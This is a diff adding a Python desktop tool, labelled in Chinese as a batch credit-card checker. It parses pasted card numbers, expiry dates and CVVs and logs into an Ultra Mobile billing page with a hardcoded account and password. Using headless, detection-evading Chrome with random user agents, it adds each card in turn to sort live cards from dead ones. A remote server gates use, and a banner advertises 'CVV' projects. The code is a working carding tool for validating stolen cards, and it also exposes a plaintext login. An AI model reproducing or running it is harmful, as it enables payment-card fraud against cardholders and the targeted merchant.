@@ -1,0 +1,382 @@
+import re
+from uuid import uuid4
+import random
+import string
+from fake_useragent import UserAgent
+from tkinter import ttk
+from tkinter import messagebox
+import requests
+import json
+from threading import Event, Thread
+from tkinter import scrolledtext, Menu
+from tkinter import scrolledtext
+from tkinter.scrolledtext import ScrolledText
+from selenium.webdriver.chrome.options import Options
+import time
+import threading
+import tkinter as tk
+paused = False
+from selenium import webdriver
+from selenium.common.exceptions import NoSuchElementException, TimeoutException
+from selenium.webdriver.common.by import By
+from selenium.webdriver.support import expected_conditions as EC
+from selenium.webdriver.support.ui import WebDriverWait
+from selenium.webdriver.chrome.options import Options as ChromeOptions
+import undetected_chromedriver as uc
+import os
+import socket
+
+
+def get_client_ip():
+    hostname = socket.gethostname()
+    return socket.gethostbyname(hostname)
+
+client_ip = get_client_ip()
+
+def generate_machine_id():
+    machine_id_file = "machine_id.txt"
+
+    if os.path.isfile(machine_id_file):
+        with open(machine_id_file, "r") as f:
+            machine_id = f.read().strip()
+    else:
+        machine_id = ''.join(random.choices(string.ascii_uppercase + string.digits, k=6))
+        with open(machine_id_file, "w") as f:
+            f.write(machine_id)
+
+    return machine_id
+
+machine_id = generate_machine_id()
+
+def process_input():
+    if not validate_input():
+        return
+
+has_auto_paused = False
+
+pause_event = Event()
+pause_event.set()  # 设置 pause_event 的初始状态为 True
+ok_cards = []
+no_cards = []
+  # 添加一个标记，表示是否已经自动暂停过
+
+def display_checking_status(card_number, dots_count):
+    result_textbox.configure(state="normal")
+    result_textbox.delete(f"{card_number}.0", f"{card_number}.end")
+    result_textbox.insert(f"{card_number}.0", f"正在检测 {card_number} {'.' * dots_count}\n")
+    result_textbox.configure(state="disabled")
+    
+    dots_count = (dots_count + 1) % 6
+    root.after(500, display_checking_status, card_number, dots_count)
+
+def input_textbox_modified(event):
+    current_input = input_textbox.get("1.0", "end-1c")
+    if len(current_input) > 0:
+        submit_button.config(state="normal")
+    else:
+        submit_button.config(state="disabled")
+
+def on_pause_resume():
+    global pause_event
+    if pause_event.is_set():
+        pause_event.clear()
+        pause_resume_button.config(text="暂停")
+    else:
+        pause_event.set()
+        pause_resume_button.config(text="继续")
+
+def check_credit_cards(cards):
+    global ok_cards, no_cards
+    for card in cards:
+        pause_event.wait()
+        card_status = check_card(card)
+        if card_status:
+            ok_cards.append(card)
+        else:
+            no_cards.append(card['card_number'])
+
+def show_popup(event, textbox):
+    popup_menu = Menu(root, tearoff=0)
+    popup_menu.add_command(label="复制", command=lambda: textbox.event_generate("<<Copy>>"))
+    popup_menu.add_command(label="粘贴", command=lambda: textbox.event_generate("<<Paste>>"))
+    popup_menu.add_command(label="剪切", command=lambda: textbox.event_generate("<<Cut>>"))
+    popup_menu.add_command(label="删除", command=lambda: textbox.delete("sel.first", "sel.last"))
+    popup_menu.add_separator()
+    popup_menu.add_command(label="全选", command=lambda: textbox.tag_add("sel", "1.0", "end-1c"))
+
+    try:
+        popup_menu.tk.call("tk_popup", popup_menu, event.x_root, event.y_root)
+    finally:
+        popup_menu.grab_release()
+        
+#以下是识别并提取卡号安全码 到期日
+import re
+
+def extract_cards_info(input_text):
+    card_info_pattern = r'\b(\d{13,19})\|?(\d{2}[\|/]?\d{2})?\|?(\d{2,4})?\b'#表示能同时匹配到日期的两种格式：05/25,02|25
+
+
+    cards_info = []
+    total_card_count = 0
+
+    card_info_list = re.findall(card_info_pattern, input_text)
+    total_card_count += len(card_info_list)
+
+    for card_info_tuple in card_info_list:
+        card_number, expiration_date, cvv = card_info_tuple
+        if expiration_date:
+            expiration_date = expiration_date.replace("|", "/")
+        else:
+            expiration_date = ""
+        if not cvv:
+            cvv = ""
+
+        cards_info.append({
+            "card_number": card_number.strip(),
+            "expiration_date": expiration_date.strip(),
+            "cvv": cvv.strip()
+        })
+
+    return cards_info, total_card_count
+
+input_text = """
+
+"""
+cards_info, total_card_count = extract_cards_info(input_text)
+print(f"Total card count: {total_card_count}")
+print(cards_info)
+#识别提取卡号，安全码，到期日完
+def on_submit():
+    global pause
+    global machine_id
+    client_id = machine_id
+    if not check_remote_status(message_label, client_id, client_ip):#用于跟远程服务器连接
+        return#用于跟远程服务器连接
+    input_text = input_textbox.get("1.0", "end-1c")
+    cards_info, total_card_count = extract_cards_info(input_text)
+
+    if total_card_count < 3:
+        messagebox.showerror("错误", "请至少输入3条以上的信用卡信息")
+    else:
+        display_card_count(total_card_count)
+        submit_button.config(state="disabled")
+        pause_resume_button.config(state="disabled")  # 禁用暂停/恢复按钮
+
+        # 新增的函数，用于启用暂停/恢复按钮
+        def enable_pause_resume_button():
+            pause_resume_button.config(state="normal")
+
+        root.after(35000, enable_pause_resume_button)  # 35秒后启用暂停/恢复按钮
+        Thread(target=add_cards, args=(cards_info,)).start()
+
+def display_card_count(card_count):
+    result_textbox.configure(state="normal")
+    result_textbox.delete("1.0", tk.END)  # 清空结果文本框
+    result_textbox.insert(tk.END, f"检测到 {card_count} 张信用卡\n")
+    result_textbox.configure(state="disabled")
+
+def login(driver):
+    driver.get("https://my.ultramobile.com/account/billing")
+    email_input = driver.find_element(By.ID, "InputText")
+    driver.execute_script(f"arguments[0].setAttribute('autocomplete', '{uuid4()}')", email_input)  # 
+    email_input.send_keys("myfensterde")
+    password_input = driver.find_element(By.ID, "InputTextPassword")
+    driver.execute_script(f"arguments[0].setAttribute('autocomplete', '{uuid4()}')", password_input)  # 
+    password_input.send_keys("Zou@412fenG")
+    login_button = driver.find_element(By.ID, "btn-login-submit")
+    login_button.click()
+#无头模式
+from selenium import webdriver
+from selenium.webdriver.chrome.options import Options as ChromeOptions
+from fake_useragent import UserAgent
+def add_cards(cards_info):
+    global ok_cards, no_cards
+    global ok_cards, no_cards
+    options = ChromeOptions()
+    options.add_argument("--headless")
+    # 创建 UserAgent 对象并生成随机 User-Agent 字符串
+    ua = UserAgent()
+    random_user_agent = ua.random
+     # 使用随机生成的 User-Agent 替换现有的 User-Agent 字符串
+    options.add_argument(f'user-agent={random_user_agent}')
+    # 创建 Chrome 选项对象
+    chrome_options = Options()
+
+# 添加参数以禁用自动填充
+    chrome_options.add_argument("--disable-features=AutofillProfile")
+    driver = uc.Chrome(executable_path='chromedriver.exe', options=options)
+    login(driver)
+    ok_cards = []
+    no_cards = []
+    for card_info in cards_info:
+        pause_event.wait()  # 新增 pause_event.wait() 用于控制暂停/继续功能
+        result = add_card(driver, card_info)
+        if result == "OK":
+            ok_cards.append(card_info)
+        else:
+            no_cards.append(card_info['card_number'])
+        time.sleep(7)  # 间隔每次添加卡的时间
+        # 在函数末尾启用输入框和重新绑定回车键
+    input_textbox.config(state="normal")
+    input_textbox.bind("<Return>", lambda event: on_submit())
+    submit_button.config(state="normal")
+    driver.quit()
+    display_final_result(ok_cards, no_cards)
+    enable_submit_button()
+
+def display_final_result(ok_cards, no_cards, pause=False):
+    result_textbox.configure(state="normal")
+    
+    result_textbox.delete("1.0", tk.END)  # 在显示最终结果之前清空结果文本框
+    
+    if pause:
+        result_textbox.insert(tk.END, f"暂停中...\n")
+    
+    result_textbox.insert(tk.END, f"OK信用卡({len(ok_cards)}张):\n")
+    for card in ok_cards:
+        result_textbox.insert(tk.END, f"{card['card_number']}|{card['expiration_date']}|{card['cvv']}\n")
+    result_textbox.insert(tk.END, f"\nNO信用卡({len(no_cards)}张):\n")
+    for card_number in no_cards:
+        result_textbox.insert(tk.END, f"{card_number}\n")
+    result_textbox.configure(state="disabled")
+
+
+def add_card(driver, card_info):
+    WebDriverWait(driver, 18).until(EC.element_to_be_clickable((By.ID, "toggleButton")))
+
+    driver.find_element(By.ID, "toggleButton").click()
+
+    try:
+        WebDriverWait(driver, 2).until(EC.presence_of_element_located((By.ID, "CardNumber")))
+        driver.find_element(By.ID, "CardNumber").send_keys(card_info["card_number"])
+        driver.find_element(By.ID, "CVV").send_keys(card_info["cvv"])
+        driver.find_element(By.ID, "ExpirationDate").send_keys(card_info["expiration_date"])
+        driver.find_element(By.ID, "InputFirstName").send_keys("DA")
+        driver.find_element(By.ID, "InputLastName").send_keys("GE")
+        driver.find_element(By.ID, "InputAddress1").send_keys("100 WATER ST")
+        driver.find_element(By.ID, "InputCity").send_keys("NEWPORT")
+        driver.find_element(By.ID, "InputState").send_keys("DE")
+        driver.find_element(By.ID, "InputTextZipCode").send_keys("98501")
+        driver.find_element(By.ID, "updateButton").click()
+
+        # 在结果文本框中显示“正在检测”
+        result_textbox.configure(state="normal")
+        result_textbox.insert(tk.END, f'{card_info["card_number"]} - 正在检测...\n')
+        result_textbox.see(tk.END)
+        result_textbox.configure(state="disabled")
+
+        try:
+            WebDriverWait(driver, 13).until(EC.presence_of_element_located((By.ID, "InputSuccess")))
+            result_text = f'{card_info["card_number"]} - OK\n'
+        except TimeoutException:
+            result_text = f'{card_info["card_number"]} - NO\n'
+            try:
+                error_element_present = WebDriverWait(driver, 2).until(
+                    EC.presence_of_element_located((By.XPATH, "//div[@id='InputError']")))
+                cancel_button_present = WebDriverWait(driver, 2).until(
+                    EC.element_to_be_clickable((By.XPATH, "//button[@id='Button']")))
+                if error_element_present and cancel_button_present:
+                    driver.find_element(By.XPATH, "//button[@id='Button']").click()
+                    WebDriverWait(driver, 2).until(EC.element_to_be_clickable((By.ID, "toggleButton")))
+
+            except TimeoutException:
+                pass
+
+    except NoSuchElementException:
+        result_text = f'{card_info["card_number"]} - NO\n'
+
+    # 更新结果文本框中的“正在检测”为最终结果
+    result_textbox.configure(state="normal")
+    result_textbox.delete(tk.END + "-2l linestart", tk.END + "-1l lineend")
+    result_textbox.insert(tk.END + "-1l lineend", result_text)
+    result_textbox.see(tk.END)
+    result_textbox.configure(state="disabled")
+    return "OK" if result_text.startswith(f'{card_info["card_number"]} - OK') else "NO"
+
+def pause_resume():
+    global pause_event
+    if pause_resume_button["text"] == "暂停":
+        pause_event.clear()
+        pause_resume_button.config(text="继续")
+        display_final_result(ok_cards, no_cards, pause=True)  # 显示暂停中...
+    else:
+        pause_event.set()
+        pause_resume_button.config(text="暂停")
+        display_final_result(ok_cards, no_cards, pause=False)  # 隐藏暂停中...
+
+def enable_submit_button():
+    submit_button.config(state="normal")
+    pause_resume_button.config(state="disabled")  # 禁用暂停/继续按钮
+
+def insert_result(content):
+    result_textbox.config(state=tk.NORMAL)  # 使文本小部件可编辑
+    result_textbox.delete(1.0, tk.END)  # 删除现有内容
+    result_textbox.insert(tk.END, fixed_content + "\n")  # 插入固定内容
+    result_textbox.insert(tk.END, content + "\n")  # 插入新内容
+    result_textbox.config(state=tk.DISABLED)  # 使文本小部件不可编辑
+
+root = tk.Tk()
+root.title("信用卡批量、自动检测器")
+
+root.geometry("800x900")
+
+# 输入框
+input_textbox = scrolledtext.ScrolledText(root, wrap=tk.WORD, font=("Roboto,arial,sans-serif", 11), bd=2, relief="groove", padx=5, pady=5)
+input_textbox.pack(fill=tk.BOTH, expand=True, padx=20, pady=10)
+input_textbox.bind("<Any-KeyPress>", input_textbox_modified)  # 绑定输入事件
+input_textbox.bind("<Button-3>", lambda event: show_popup(event, input_textbox))
+
+#这里用于与远程连接
+def check_remote_status(message_label, client_id,client_ip,):
+    try:
+        response = requests.get(f"http://vf.haoka.me:3600/check_status?client_id={client_id}")
+
+        response.raise_for_status()  # 检查请求是否成功，如果失败会引发异常
+
+        try:
+            script_status = response.json().get("status")
+            if script_status == "enabled":
+                message_label.config(text="")
+                return True
+            elif script_status == "disabled":
+                message_label.config(text="错误：已限制使用检测，请联系管理员。")
+                return False
+        except ValueError:
+            message_label.config(text="警告：服务器响应无效，请联系管理员。")
+            return False
+
+    except requests.RequestException:
+        message_label.config(text="警告：无法连接到远程服务器，请检查网络连接。")
+        return False
+
+# 创建一个容器来包含检测和暂停/继续按钮
+button_container = tk.Frame(root)
+button_container.pack(pady=10)
+# 这里用于远程连接的
+message_label = tk.Label(root, text="", fg="red", font=("Roboto,arial,sans-serif", 11))# 这里用于远程连接的
+message_label.pack(pady=10)# 这里用于远程连接的
+        
+submit_button = tk.Button(button_container, text="检测", command=on_submit, state="disabled")  # 初始禁用检测按钮
+submit_button.grid(row=0, column=0, padx=(0, 10))  # 放置在网格布局的第 0 行、第 0 列，右侧间隔 10 像素
+
+# 新增暂停/继续按钮
+pause_resume_button = tk.Button(button_container, text="暂停", command=pause_resume)
+pause_resume_button.grid(row=0, column=1)  # 放置在网格布局的第 0 行、第 1 列
+result_textbox = ScrolledText(root, wrap=tk.WORD, bg="white", font=("Sans-serif", 12))
+fixed_label = tk.Label(root, text=f"准确率100%！零伤卡！更多CVV项目内容，请访问www.cvv.tw\n用户ID: {machine_id}", bg="#F0F0F0", fg="#0058e6", font=("Sans-serif", 12, ), justify='left')
+fixed_label.pack(side=tk.TOP, fill=tk.X)
+result_textbox.pack(side=tk.BOTTOM, fill=tk.BOTH, expand=True)
+
+result_textbox.bind("<Button-3>", lambda event: show_popup(event, result_textbox))
+
+def on_text_change(*args):
+    input_text = input_textbox.get("1.0", "end-1c")
+    if input_text:
+        submit_button.config(state="normal")
+    else:
+        submit_button.config(state="disabled")
+
+input_textbox.bind("<<Modified>>", on_text_change)
+input_textbox.bind("<Button-3>", lambda event: show_popup(event, input_textbox))
+ # 插入固定内容
+root.mainloop()
